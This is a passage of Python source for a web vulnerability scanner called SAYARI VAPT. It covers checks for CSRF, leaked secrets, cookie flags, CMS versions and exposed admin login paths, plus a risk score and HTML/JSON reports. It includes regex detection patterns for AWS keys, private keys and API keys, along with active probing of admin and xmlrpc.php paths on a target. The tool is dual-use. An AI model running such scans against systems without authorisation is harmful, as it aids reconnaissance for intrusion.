                                   f"Attackers could trick authenticated users into submitting unwanted actions.",
                        url=form['action'],
                        recommendation="Implement anti-CSRF tokens in all state-changing forms. "
                                     "Use SameSite cookie attribute. Verify tokens on the server side."
                    )
                    self.add_vulnerability(vuln)
    
    def check_information_disclosure(self):
        """Check for information disclosure"""
        self.log("Testing for information disclosure...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            return
        
        content = response.text
        
        # Check for sensitive data patterns
        patterns = {
            'Email Addresses': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'Phone Numbers': r'(?:\+?1[-.]?)?\(?[0-9]{3}\)?[-.]?[0-9]{3}[-.]?[0-9]{4}',
            'SSN': r'\d{3}-\d{2}-\d{4}',
            'Credit Card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r"(?i)aws(.{0,20})?['\"][0-9a-zA-Z/+=]{40}['\"]",
            'Private Key': r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
            'API Keys': r"(?i)(api[_-]?key|apikey|access[_-]?key|secret[_-]?key)[\s]*[=:][\s]*['\"]?[a-zA-Z0-9_\-]{20,}",
            'Internal IPs': r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})',
            'Database Connection': r"(?i)(mysql|postgres|mongodb|redis)://[^\s<>\"']+",
        }
        
        for pattern_name, pattern in patterns.items():
            matches = re.findall(pattern, content)
            if matches and len(matches) < 50:  # Avoid false positives from large lists
                vuln = Vulnerability(
                    name=f"Information Disclosure: {pattern_name}",
                    severity=Severity.HIGH if pattern_name in ['SSN', 'Credit Card', 'Private Key', 'AWS Access Key', 'AWS Secret Key'] else Severity.MEDIUM,
                    description=f"Potential {pattern_name} found exposed in the response. "
                               f"This information could be used by attackers for social engineering, "
                               f"credential stuffing, or other attacks.",
                    url=self.target_url,
                    recommendation="Remove sensitive data from client-side code. "
                                 "Ensure proper data sanitization before displaying to users. "
                                 "Review what information needs to be exposed."
                )
                self.add_vulnerability(vuln)
    
    def check_cookie_security(self):
        """Check cookie security attributes"""
        self.log("Testing cookie security...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            return
        
        cookies = response.cookies
        
        for cookie in cookies:
            issues = []
            
            if not cookie.secure:
                issues.append("Missing Secure flag")
            if not cookie.has_nonstandard_attr('HttpOnly'):
                issues.append("Missing HttpOnly flag")
            if not cookie.has_nonstandard_attr('SameSite'):
                issues.append("Missing SameSite attribute")
            
            if issues:
                vuln = Vulnerability(
                    name=f"Insecure Cookie: {cookie.name}",
                    severity=Severity.MEDIUM,
                    description=f"Cookie '{cookie.name}' has security issues: {', '.join(issues)}. "
                               f"Insecure cookies can be intercepted or accessed by attackers via XSS.",
                    url=self.target_url,
                    recommendation="Set Secure flag to ensure cookies are only sent over HTTPS. "
                                 "Set HttpOnly to prevent JavaScript access. "
                                 "Set SameSite to Strict or Lax to prevent CSRF."
                )
                self.add_vulnerability(vuln)
    
    def check_cms_vulnerabilities(self):
        """Check for CMS-specific vulnerabilities"""
        self.log("Testing CMS vulnerabilities...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            return
        
        content = response.text
        headers = response.headers
        
        # WordPress detection
        wp_indicators = ['wp-content', 'wp-includes', 'wp-admin', 'wordpress']
        is_wordpress = any(indicator in content.lower() for indicator in wp_indicators)
        
        if is_wordpress:
            # Check WordPress version
            version_match = re.search(r'WordPress\s+([0-9.]+)', content, re.IGNORECASE)
            if version_match:
                vuln = Vulnerability(
                    name="WordPress Version Disclosure",
                    severity=Severity.LOW,
                    description=f"WordPress version {version_match.group(1)} is disclosed. "
                               f"Attackers can target known vulnerabilities for this version.",
                    url=self.target_url,
                    recommendation="Remove WordPress version information from the HTML source. "
                                 "Keep WordPress updated to the latest version."
                )
                self.add_vulnerability(vuln)
            
            # Check for XML-RPC
            xmlrpc_url = f"{self.target_url}/xmlrpc.php"
            xmlrpc_response = self.make_request(xmlrpc_url)
            if xmlrpc_response and xmlrpc_response.status_code == 200:
                vuln = Vulnerability(
                    name="XML-RPC Enabled",
                    severity=Severity.MEDIUM,
                    description="WordPress XML-RPC is enabled. This can be used for "
                               f"brute force attacks, DDoS attacks via pingback, and other exploits.",
                    url=xmlrpc_url,
                    recommendation="Disable XML-RPC if not needed. Block access to xmlrpc.php "
                                 "at the web server level or use security plugins."
                )
                self.add_vulnerability(vuln)
        
        # Joomla detection
        joomla_indicators = ['joomla', 'option=com_', 'templates/joomla']
        is_joomla = any(indicator in content.lower() for indicator in joomla_indicators)
        
        if is_joomla:
            vuln = Vulnerability(
                name="Joomla CMS Detected",
                severity=Severity.INFO,
                description="Joomla CMS detected. Ensure the installation is kept up to date "
                           f"and all security patches are applied.",
                url=self.target_url,
                recommendation="Keep Joomla updated. Remove version information. "
                             "Use security extensions and follow hardening guides."
            )
            self.add_vulnerability(vuln)
        
        # Drupal detection
        drupal_indicators = ['drupal', 'sites/default/files', 'misc/drupal.js']
        is_drupal = any(indicator in content.lower() for indicator in drupal_indicators)
        
        if is_drupal:
            # Check for Drupalgeddon
            test_response = self.make_request(f"{self.target_url}/user/register")
            if test_response and 'drupal' in test_response.text.lower():
                vuln = Vulnerability(
                    name="Drupal CMS Detected",
                    severity=Severity.INFO,
                    description="Drupal CMS detected. Ensure the installation is kept up to date "
                               f"and all security patches are applied, especially Drupalgeddon vulnerabilities.",
                    url=self.target_url,
                    recommendation="Keep Drupal updated. Apply security patches promptly. "
                                 "Follow Drupal security best practices."
                )
                self.add_vulnerability(vuln)
    
    def check_default_credentials(self):
        """Check for default credential pages"""
        self.log("Testing for default credential pages...", "INFO")
        
        default_login_paths = [
            '/admin', '/administrator', '/admin/login', '/login', '/signin',
            '/wp-login.php', '/wp-admin', '/user/login', '/account/login',
            '/manager/html', '/phpmyadmin', '/adminer.php', '/cpanel',
            '/console', '/dashboard', '/controlpanel'
        ]
        
        for path in default_login_paths:
            url = f"{self.target_url}{path}"
            response = self.make_request(url)
            
            if response and response.status_code == 200:
                if self._is_login_page(response.text):
                    vuln = Vulnerability(
                        name=f"Admin/Login Page Exposed: {path}",
                        severity=Severity.LOW,
                        description=f"An administrative login page is accessible at {path}. "
                                   f"Exposed admin interfaces increase the attack surface for "
                                   f"brute force and credential stuffing attacks.",
                        url=url,
                        recommendation="Restrict access to admin pages to authorized IP addresses. "
                                     "Implement rate limiting and account lockout policies. "
                                     "Use multi-factor authentication."
                    )
                    self.add_vulnerability(vuln)
    
    def _is_login_page(self, content: str) -> bool:
        """Check if content is a login page"""
        login_indicators = ['password', 'username', 'login', 'sign in', 
                           'email', 'submit', '<form', 'type="password"']
        
        content_lower = content.lower()
        matches = sum(1 for indicator in login_indicators if indicator in content_lower)
        
        return matches >= 4 and 'type="password"' in content_lower
    
    def run_all_checks(self):
        """Run all vulnerability checks"""
        self.banner()
        
        print(f"\n{Colors.BOLD}Target: {self.target_url}{Colors.END}")
        print(f"{Colors.BOLD}Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}\n")
        
        checks = [
            ("Security Headers", self.check_security_headers),
            ("SSL/TLS Configuration", self.check_ssl_tls),
            ("SQL Injection", self.check_sql_injection),
            ("Cross-Site Scripting", self.check_xss),
            ("Directory Traversal", self.check_directory_traversal),
            ("Open Redirect", self.check_open_redirect),
            ("Sensitive Files", self.check_sensitive_files),
            ("CORS Configuration", self.check_cors),
            ("Clickjacking", self.check_clickjacking),
            ("CSRF Protection", self.check_csrf),
            ("Information Disclosure", self.check_information_disclosure),
            ("Cookie Security", self.check_cookie_security),
            ("CMS Vulnerabilities", self.check_cms_vulnerabilities),
            ("Default Credentials", self.check_default_credentials),
        ]
        
        for check_name, check_func in checks:
            try:
                check_func()
                time.sleep(0.5)  # Rate limiting
            except Exception as e:
                self.log(f"Error in {check_name}: {str(e)}", "ERROR")
        
        self.generate_report()
    
    def generate_report(self):
        """Generate vulnerability report"""
        print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}SAYARI VAPT SCAN REPORT{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}\n")
        
        # Summary
        severity_counts = {
            Severity.CRITICAL: 0,
            Severity.HIGH: 0,
            Severity.MEDIUM: 0,
            Severity.LOW: 0,
            Severity.INFO: 0
        }
        
        for vuln in self.vulnerabilities:
            severity_counts[vuln.severity] += 1
        
        print(f"{Colors.BOLD}SUMMARY:{Colors.END}")
        print(f"  {Colors.RED}Critical: {severity_counts[Severity.CRITICAL]}{Colors.END}")
        print(f"  {Colors.MAGENTA}High: {severity_counts[Severity.HIGH]}{Colors.END}")
        print(f"  {Colors.YELLOW}Medium: {severity_counts[Severity.MEDIUM]}{Colors.END}")
        print(f"  {Colors.BLUE}Low: {severity_counts[Severity.LOW]}{Colors.END}")
        print(f"  {Colors.CYAN}Info: {severity_counts[Severity.INFO]}{Colors.END}")
        print(f"  {Colors.WHITE}Total: {len(self.vulnerabilities)}{Colors.END}\n")
        
        # Risk Score
        risk_score = (severity_counts[Severity.CRITICAL] * 10 +
                     severity_counts[Severity.HIGH] * 7 +
                     severity_counts[Severity.MEDIUM] * 4 +
                     severity_counts[Severity.LOW] * 1)
        
        if risk_score >= 20:
            risk_level = f"{Colors.RED}CRITICAL{Colors.END}"
        elif risk_score >= 10:
            risk_level = f"{Colors.MAGENTA}HIGH{Colors.END}"
        elif risk_score >= 5:
            risk_level = f"{Colors.YELLOW}MEDIUM{Colors.END}"
        else:
            risk_level = f"{Colors.GREEN}LOW{Colors.END}"
        
        print(f"{Colors.BOLD}RISK LEVEL: {risk_level}{Colors.END}")
        print(f"{Colors.BOLD}RISK SCORE: {risk_score}{Colors.END}\n")
        
        # Detailed findings
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}DETAILED FINDINGS:{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}\n")
        
        # Sort by severity
        severity_order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]
        sorted_vulns = sorted(self.vulnerabilities, 
                             key=lambda v: severity_order.index(v.severity))
        
        for i, vuln in enumerate(sorted_vulns, 1):
            print(f"\n{Colors.BOLD}[{i}] {vuln.name}{Colors.END}")
            print(f"    Severity: {vuln.severity}")
            print(f"    URL: {vuln.url}")
            print(f"    Description: {vuln.description}")
            if vuln.payload:
                print(f"    Payload: {vuln.payload}")
            print(f"    Recommendation: {vuln.recommendation}")
            print(f"    Discovered: {vuln.timestamp}")
        
        # Save report to file
        self._save_report_file(sorted_vulns, severity_counts, risk_score, risk_level)
    
    def _save_report_file(self, vulns: List[Vulnerability], counts: Dict, 
                          risk_score: int, risk_level: str):
        """Save report to JSON and HTML files"""
        # Create safe filename from domain
        safe_domain = re.sub(r'[^a-zA-Z0-9]', '_', self.domain)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_filename = f"{safe_domain}_vapt_{timestamp}"
        
        # JSON Report
        json_report = {
            'target': self.target_url,
            'domain': self.domain,
            'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'summary': counts,
            'risk_score': risk_score,
            'risk_level': risk_level.replace(Colors.RED, '').replace(Colors.END, '').replace(Colors.MAGENTA, '').replace(Colors.YELLOW, '').replace(Colors.GREEN, ''),
            'total_vulnerabilities': len(vulns),
            'vulnerabilities': [
                {
                    'id': i,
                    'name': v.name,
                    'severity': v.severity,
                    'description': v.description,
                    'url': v.url,
                    'payload': v.payload,
                    'recommendation': v.recommendation,
                    'timestamp': v.timestamp
                }
                for i, v in enumerate(vulns, 1)
            ]
        }
        
        json_path = f"{base_filename}.json"
        with open(json_path, 'w') as f:
            json.dump(json_report, f, indent=2)
        
        # HTML Report
        html_report = self._generate_html_report(vulns, counts, risk_score, risk_level)
        html_path = f"{base_filename}.html"
        with open(html_path, 'w') as f:
            f.write(html_report)
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
        print(f"{Colors.GREEN}Reports saved successfully:{Colors.END}")
        print(f"{Colors.CYAN}  📄 JSON: {json_path}{Colors.END}")
        print(f"{Colors.CYAN}  📊 HTML: {html_path}{Colors.END}")
        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
    
    def _generate_html_report(self, vulns: List[Vulnerability], counts: Dict,
                              risk_score: int, risk_level: str) -> str:
        """Generate professional HTML report with charts"""
        
        # Clean risk level for display
        clean_risk_level = risk_level.replace(Colors.RED, '').replace(Colors.END, '').replace(
            Colors.MAGENTA, '').replace(Colors.YELLOW, '').replace(Colors.GREEN, '')
        
        # Determine risk color
        risk_colors = {
            'CRITICAL': '#dc3545',
            'HIGH': '#fd7e14',
            'MEDIUM': '#ffc107',
            'LOW': '#28a745'
        }
        risk_color = risk_colors.get(clean_risk_level, '#6c757d')
        
        # Generate vulnerability category breakdown
        category_counts = {}
        for v in vulns:
            # Extract category from vulnerability name
            if 'SQL' in v.name:
                cat = 'SQL Injection'
            elif 'XSS' in v.name or 'Scripting' in v.name:
                cat = 'XSS'
            elif 'Traversal' in v.name:
                cat = 'Directory Traversal'
            elif 'Redirect' in v.name:
                cat = 'Open Redirect'
            elif 'Header' in v.name or 'CORS' in v.name:
                cat = 'Security Headers'
            elif 'SSL' in v.name or 'TLS' in v.name or 'Certificate' in v.name:
                cat = 'SSL/TLS'
            elif 'File' in v.name:
                cat = 'Sensitive Files'
            elif 'Clickjacking' in v.name:
                cat = 'Clickjacking'
            elif 'CSRF' in v.name:
                cat = 'CSRF'
            elif 'Cookie' in v.name:
                cat = 'Cookie Security'
            elif 'Disclosure' in v.name:
                cat = 'Information Disclosure'
            elif 'CMS' in v.name or 'WordPress' in v.name or 'Drupal' in v.name or 'Joomla' in v.name:
                cat = 'CMS Issues'
            elif 'Login' in v.name or 'Admin' in v.name:
                cat = 'Admin Exposure'
            else:
                cat = 'Other'
            
            category_counts[cat] = category_counts.get(cat, 0) + 1
        
        # Generate vulnerability rows with expandable details
        vuln_rows = ""
        for i, v in enumerate(vulns, 1):
            severity_colors = {
                'CRITICAL': '#dc3545',
                'HIGH': '#fd7e14',
                'MEDIUM': '#ffc107',
                'LOW': '#17a2b8',
                'INFO': '#6c757d'
            }
            color = severity_colors.get(v.severity, '#6c757d')
            
            # Truncate long descriptions for table
            short_desc = v.description[:100] + "..." if len(v.description) > 100 else v.description
            
            vuln_rows += f"""
            <tr class="vuln-row" onclick="toggleDetails({i})">
                <td><strong>#{i}</strong></td>
                <td><span class="severity-badge" style="background-color: {color};">{html.escape(v.severity)}</span></td>
                <td><strong>{html.escape(v.name)}</strong></td>
                <td><a href="{html.escape(v.url)}" target="_blank" class="url-link">{html.escape(v.url[:50])}{'...' if len(v.url) > 50 else ''}</a></td>
                <td>{html.escape(short_desc)}</td>
                <td><button class="expand-btn" onclick="event.stopPropagation(); toggleDetails({i})">Details</button></td>
            </tr>
            <tr id="details-{i}" class="details-row">
                <td colspan="6">
                    <div class="details-content">
                        <div class="detail-grid">
                            <div class="detail-item">
                                <span class="detail-label">🔍 Full Description:</span>
                                <p>{html.escape(v.description)}</p>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">🔗 Full URL:</span>
                                <p><a href="{html.escape(v.url)}" target="_blank">{html.escape(v.url)}</a></p>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">💉 Payload:</span>
                                <code class="payload-code">{html.escape(v.payload) if v.payload else 'N/A'}</code>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">✅ Recommendation:</span>
                                <p>{html.escape(v.recommendation)}</p>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">🕐 Discovered:</span>
                                <p>{v.timestamp}</p>
                            </div>
                        </div>
                    </div>
                </td>
            </tr>
            """
        
        # Generate category labels and data for charts
        category_labels = list(category_counts.keys())
        category_data = list(category_counts.values())
        
        html_report = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SAYARI VAPT Security Report - {self.domain}</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #e4e4e4;
            line-height: 1.6;
        }}
        
        .main-container {{
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        /* Header Section */
        .header {{
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            position: relative;
            overflow: hidden;
        }}
        
        .header::before {{
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0,123,255,0.1) 0%, transparent 70%);
            animation: pulse 4s ease-in-out infinite;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ transform: scale(1); opacity: 0.5; }}
            50% {{ transform: scale(1.1); opacity: 0.8; }}
        }}
        
        .header-content {{
            position: relative;
            z-index: 1;
        }}
        
        .logo {{
            font-size: 2.5em;
            font-weight: 700;
            background: linear-gradient(135deg, #00d4ff, #7c3aed, #f472b6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }}
        
        .subtitle {{
            color: #94a3b8;
            font-size: 1.1em;
            margin-bottom: 25px;
        }}
        
        .target-info {{
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-top: 20px;
        }}
        
        .info-card {{
            background: rgba(255,255,255,0.05);
            padding: 15px 25px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }}
        
        .info-card label {{
            display: block;
            font-size: 0.85em;
            color: #94a3b8;
            margin-bottom: 5px;
        }}
        
        .info-card value {{
            display: block;
            font-size: 1.1em;
            font-weight: 600;
            color: #e2e8f0;
            word-break: break-all;
        }}
        
        /* Risk Score Section */
        .risk-section {{
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
        }}
        
        .risk-score-container {{
            text-align: center;
        }}
        
        .risk-score {{
            font-size: 4em;
            font-weight: 700;
            color: {risk_color};
            text-shadow: 0 0 30px {risk_color}40;
        }}
        
        .risk-level {{
            font-size: 1.5em;
            font-weight: 600;
            color: {risk_color};
            margin-top: 5px;
        }}
        
        .risk-label {{
            color: #94a3b8;
            font-size: 0.9em;
        }}
        
        /* Stats Grid */
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }}
        
        .stat-card {{
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 25px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }}
        
        .stat-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }}
        
        .stat-card.critical {{ border-top: 4px solid #dc3545; }}
        .stat-card.high {{ border-top: 4px solid #fd7e14; }}
        .stat-card.medium {{ border-top: 4px solid #ffc107; }}
        .stat-card.low {{ border-top: 4px solid #17a2b8; }}
        .stat-card.info {{ border-top: 4px solid #6c757d; }}
        .stat-card.total {{ border-top: 4px solid #7c3aed; }}
        
        .stat-number {{
            font-size: 2.5em;
            font-weight: 700;
            margin-bottom: 5px;
        }}
        
        .stat-card.critical .stat-number {{ color: #dc3545; }}
        .stat-card.high .stat-number {{ color: #fd7e14; }}
        .stat-card.medium .stat-number {{ color: #ffc107; }}
        .stat-card.low .stat-number {{ color: #17a2b8; }}
        .stat-card.info .stat-number {{ color: #94a3b8; }}
        .stat-card.total .stat-number {{ color: #7c3aed; }}
        
        .stat-label {{
            color: #94a3b8;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        /* Charts Section */
        .charts-section {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 30px;
            margin-bottom: 30px;
        }}
        
        .chart-container {{
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255,255,255,0.1);
        }}
        
        .chart-title {{
            font-size: 1.3em;
            font-weight: 600;
            margin-bottom: 20px;
            color: #e2e8f0;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .chart-wrapper {{
            position: relative;
            height: 300px;
        }}
        
        /* Vulnerabilities Table */
        .table-section {{
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            overflow: hidden;
        }}
        
        .table-title {{
            font-size: 1.5em;
            font-weight: 600;
            margin-bottom: 25px;
            color: #e2e8f0;
        }}
        
        .vuln-table {{
            width: 100%;
            border-collapse: collapse;
        }}
        
        .vuln-table th {{
            background: rgba(0,0,0,0.3);
            padding: 15px 20px;
            text-align: left;
            font-weight: 600;
            color: #94a3b8;
            text-transform: uppercase;
            font-size: 0.8em;
            letter-spacing: 1px;
        }}
        
        .vuln-table td {{
            padding: 15px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            vertical-align: top;
        }}
        
        .vuln-row {{
            cursor: pointer;
            transition: background 0.2s ease;
        }}
        
        .vuln-row:hover {{
            background: rgba(255,255,255,0.05);
        }}
        
        .severity-badge {{
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: 600;
            color: white;
            text-transform: uppercase;
        }}
        
        .url-link {{
            color: #60a5fa;
            text-decoration: none;
            word-break: break-all;
        }}
        
        .url-link:hover {{
            text-decoration: underline;
        }}
        
        .expand-btn {{
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }}
        
        .expand-btn:hover {{
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(59, 130, 246, 0.4);
        }}
        
        /* Details Row */
        .details-row {{
            display: none;
            background: rgba(0,0,0,0.2);
        }}
        
        .details-row.show {{
            display: table-row;
        }}
        
        .details-content {{
            padding: 20px;
        }}
        
        .detail-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }}
        
        .detail-item {{
            background: rgba(255,255,255,0.03);
            padding: 15px;
            border-radius: 10px;
        }}
        
        .detail-label {{
            display: block;
            font-weight: 600;
            color: #60a5fa;
            margin-bottom: 8px;
            font-size: 0.9em;
        }}
        
        .detail-item p {{
            color: #cbd5e1;
            font-size: 0.95em;
        }}
        
        .payload-code {{
            display: block;
            background: rgba(0,0,0,0.4);
            padding: 10px 15px;
            border-radius: 8px;
            font-family: 'Fira Code', monospace;
            font-size: 0.85em;
            color: #f472b6;
            word-break: break-all;
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            padding: 30px;
            color: #64748b;
            font-size: 0.9em;
        }}
        
        /* Responsive */
        @media (max-width: 768px) {{
            .charts-section {{
                grid-template-columns: 1fr;
            }}
            
            .chart-container {{
                min-width: auto;
            }}
            
            .risk-score {{
                font-size: 3em;
            }}
            
            .logo {{
                font-size: 1.8em;
            }}
            
            .vuln-table {{
                font-size: 0.85em;
            }}
        }}
        
        /* Print Styles */
        @media print {{
            body {{
                background: white;
                color: black;
            }}
            
            .header, .risk-section, .stat-card, .chart-container, .table-section {{
                background: white;
                border: 1px solid #ddd;
            }}
        }}
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Header -->
        <div class="header">
            <div class="header-content">
                <div class="logo">🛡️ SAYARI VAPT Security Report</div>
                <div class="subtitle">Comprehensive Vulnerability Assessment & Penetration Testing Analysis</div>
                
                <div class="target-info">
                    <div class="info-card">
                        <label>🎯 Target</label>
                        <value>{self.target_url}</value>
                    </div>
                    <div class="info-card">
                        <label>📅 Scan Date</label>
                        <value>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</value>
                    </div>
                    <div class="info-card">
                        <label>🌐 Domain</label>
                        <value>{self.domain}</value>
                    </div>
                    <div class="info-card">
                        <label>⏱️ Duration</label>
                        <value>Complete Scan</value>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Risk Score -->
        <div class="risk-section">
            <div class="risk-score-container">
                <div class="risk-score">{risk_score}</div>
                <div class="risk-level">{clean_risk_level} RISK</div>
                <div class="risk-label">Overall Security Score</div>
            </div>
            
            <div class="stats-grid" style="flex: 1; max-width: 600px;">
                <div class="stat-card critical">
                    <div class="stat-number">{counts[Severity.CRITICAL]}</div>
                    <div class="stat-label">Critical</div>
                </div>
                <div class="stat-card high">
                    <div class="stat-number">{counts[Severity.HIGH]}</div>
                    <div class="stat-label">High</div>
                </div>
                <div class="stat-card medium">
                    <div class="stat-number">{counts[Severity.MEDIUM]}</div>
                    <div class="stat-label">Medium</div>
                </div>
                <div class="stat-card low">
                    <div class="stat-number">{counts[Severity.LOW]}</div>
                    <div class="stat-label">Low</div>
                </div>
                <div class="stat-card info">
                    <div class="stat-number">{counts[Severity.INFO]}</div>
                    <div class="stat-label">Info</div>
                </div>
            </div>
        </div>
        
        <!-- Stats Cards -->
        <div class="stats-grid">
            <div class="stat-card total">
                <div class="stat-number">{len(vulns)}</div>
                <div class="stat-label">Total Vulnerabilities</div>
            </div>
            <div class="stat-card high">
                <div class="stat-number">{counts[Severity.CRITICAL] + counts[Severity.HIGH]}</div>
                <div class="stat-label">High Priority Issues</div>
            </div>
            <div class="stat-card medium">
                <div class="stat-number">{len(category_counts)}</div>
                <div class="stat-label">Categories Affected</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color: #28a745;">{max(0, 100 - risk_score)}%</div>
                <div class="stat-label">Security Score</div>
            </div>
        </div>
        
        <!-- Charts -->
        <div class="charts-section">
            <div class="chart-container">
                <div class="chart-title">📊 Vulnerability Distribution</div>
                <div class="chart-wrapper">
                    <canvas id="severityChart"></canvas>
                </div>
            </div>
            <div class="chart-container">
                <div class="chart-title">📈 Categories Breakdown</div>
                <div class="chart-wrapper">
                    <canvas id="categoryChart"></canvas>
                </div>
            </div>
        </div>
        
        <!-- Vulnerabilities Table -->
        <div class="table-section">
            <div class="table-title">🔍 Detailed Vulnerability Findings</div>
            <table class="vuln-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Severity</th>
                        <th>Vulnerability</th>
                        <th>URL</th>
                        <th>Description</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {vuln_rows}
                </tbody>
            </table>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <p>SAYARI VAPT Scanner created by Dr3amy | For Authorized Security Testing Only</p>
            <p>Report generated on {datetime.now().strftime('%B %d, %Y at %I:%M %p')}</p>
        </div>
    </div>
    
    <script>
        // Toggle vulnerability details
        function toggleDetails(id) {{
            const row = document.getElementById('details-' + id);
            row.classList.toggle('show');
        }}
        
        // Severity Distribution Pie Chart
        const severityCtx = document.getElementById('severityChart').getContext('2d');
        new Chart(severityCtx, {{
            type: 'doughnut',
            data: {{
                labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
                datasets: [{{
                    data: [{counts[Severity.CRITICAL]}, {counts[Severity.HIGH]}, {counts[Severity.MEDIUM]}, {counts[Severity.LOW]}, {counts[Severity.INFO]}],
                    backgroundColor: [
                        '#dc3545',
                        '#fd7e14',
                        '#ffc107',
                        '#17a2b8',
                        '#6c757d'
                    ],
                    borderColor: 'rgba(255,255,255,0.1)',
                    borderWidth: 2,
                    hoverOffset: 10
                }}]
            }},
            options: {{
                responsive: true,
                maintainAspectRatio: false,
                plugins: {{
                    legend: {{
                        position: 'bottom',
                        labels: {{
                            color: '#94a3b8',
                            padding: 20,
                            font: {{
                                size: 12
                            }}
                        }}
                    }}
                }},
                cutout: '60%'
            }}
        }});
        
        // Category Bar Chart
        const categoryCtx = document.getElementById('categoryChart').getContext('2d');
        new Chart(categoryCtx, {{
            type: 'bar',
            data: {{
                labels: {json.dumps(category_labels)},
                datasets: [{{
                    label: 'Vulnerabilities',
                    data: {json.dumps(category_data)},
                    backgroundColor: [
                        'rgba(220, 53, 69, 0.8)',
                        'rgba(253, 126, 20, 0.8)',
                        'rgba(255, 193, 7, 0.8)',
                        'rgba(23, 162, 184, 0.8)',
                        'rgba(108, 117, 125, 0.8)',
                        'rgba(124, 58, 237, 0.8)',
                        'rgba(236, 72, 153, 0.8)',
                        'rgba(34, 197, 94, 0.8)',
                        'rgba(59, 130, 246, 0.8)',
                        'rgba(168, 85, 247, 0.8)'
                    ],
                    borderColor: 'rgba(255,255,255,0.1)',
                    borderWidth: 1,
                    borderRadius: 8
                }}]
            }},
            options: {{
                responsive: true,
                maintainAspectRatio: false,
                indexAxis: 'y',
                plugins: {{
                    legend: {{
                        display: false
                    }}
                }},
                scales: {{
                    x: {{
                        grid: {{
